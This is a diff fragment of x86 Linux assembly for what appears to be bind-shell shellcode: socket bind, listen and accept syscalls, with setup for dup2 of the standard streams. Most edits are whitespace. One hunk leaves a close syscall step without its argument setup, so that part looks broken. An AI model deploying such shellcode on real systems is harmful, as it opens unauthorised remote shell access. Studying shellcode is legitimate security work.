@@ -48,7 +48,7 @@ _start:
 	
 	mov esi, esp          ; keep track of *sockaddr_in
 
-    ; push args for bind
+	; push args for bind
    	push byte 0x10        ; 16 for len of sockaddr_in
 	mov ecx, esp          ; keeps track of *addrlen
 	push esi              ; for *sockaddr_in  DO NOT CHANGE UNTIL ACCEPT
@@ -76,15 +76,15 @@ _start:
 	push edi              ; for sockfd
 
 	;
-    ; SETUP ARGS PASSED TO SYS_LISTEN SYSCALL
-    ;
+    	; SETUP ARGS PASSED TO SYS_LISTEN SYSCALL
+    	;
 	mov ecx, esp
 
 	xor ebx, ebx
-    mov bl, 0x04          ; socketcall takes 4 for SYS_LISTEN
+    	mov bl, 0x04          ; socketcall takes 4 for SYS_LISTEN
 
-    xor eax, eax
-    mov al, 0x66          ; for socket syscall
+    	xor eax, eax
+    	mov al, 0x66          ; for socket syscall
 
 	int 0x80              ; 102, SYS_LISTEN, socket_args*
 	
@@ -97,7 +97,7 @@ _start:
 	push byte 0x10
 	push esp              ; for *addr_len
 	push esi              ; for *sockaddr_in (HELD SINCE BIND)
-    push edi              ; for sockfd (HELD SINCE BIND)
+    	push edi              ; for sockfd (HELD SINCE BIND)
 
 	;
 	; SETUP ARGS PASSED TO SYS_ACCEPT SYSCALL
@@ -105,22 +105,18 @@ _start:
 
 	mov ecx, esp
 
-    xor ebx, ebx
-    mov bl, 0x05          ; socketcall takes 5 for SYS_ACCEPT
+    	xor ebx, ebx
+    	mov bl, 0x05          ; socketcall takes 5 for SYS_ACCEPT
 
-    xor eax, eax
-    mov al, 0x66          ; for socket syscall
+  	xor eax, eax
+    	mov al, 0x66          ; for socket syscall
 
-    int 0x80              ; 102, SYS_ACCEPT, socket_args*
+    	int 0x80              ; 102, SYS_ACCEPT, socket_args*
 
 	;
 	; PERFORM 3 DUP2 FOR STDOUT, STDIN, AND STDERR FOR CHILD PROCESS
 	;
 	push eax              ; temporarily holding CONNECTION fd so as to not lose track
-	;mov ebx, edi          ; setup for sockfd close
-	;mov edi, eax          ; hold new connection fd
-	;xor eax, eax
-	;mov al, 0x06          ; syscall for close
 	
 	int 0x80              ; -> syscall to close original sock fd
 
